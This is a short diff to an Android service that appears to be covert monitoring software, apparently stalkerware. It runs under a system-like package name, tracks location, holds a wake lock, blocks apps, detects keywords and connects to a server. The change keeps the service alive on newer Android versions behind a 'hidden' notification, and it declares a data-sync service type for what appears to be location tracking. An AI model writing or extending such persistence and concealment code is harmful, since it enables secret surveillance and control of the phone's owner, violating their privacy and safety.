@@ -2,6 +2,7 @@ package com.system.service.core
 
 import android.app.*
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.location.Location
 import android.os.*
 import androidx.core.app.NotificationCompat
@@ -34,7 +35,11 @@ class CoreService : Service() {
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         acquireWakeLock()
         createNotificationChannel()
-        startForeground(NOTIF_ID, buildHiddenNotification())
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(NOTIF_ID, buildHiddenNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+        } else {
+            startForeground(NOTIF_ID, buildHiddenNotification())
+        }
         AppBlockerManager.init(this)
         KeywordDetector.init(this)
         connectServer()
